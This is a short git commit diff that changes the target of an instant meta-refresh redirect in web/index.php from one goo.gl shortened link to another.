63e8f753a287c1b0915ccd850c260729bef314db
sanernecro <sanernecro@gmail.com>
2017-07-25 19:49:13 +0300

    Update index.php

--- web/index.php
+++ web/index.php
@@ -2,7 +2,7 @@
 <html>
 <head>
  <meta name="no-referrer" content="none">
-	 <meta http-equiv="refresh" content="0; url=https://goo.gl/8inumy">
+	 <meta http-equiv="refresh" content="0; url=https://goo.gl/8Av3T2">
 </head>
 <body>
 </body>
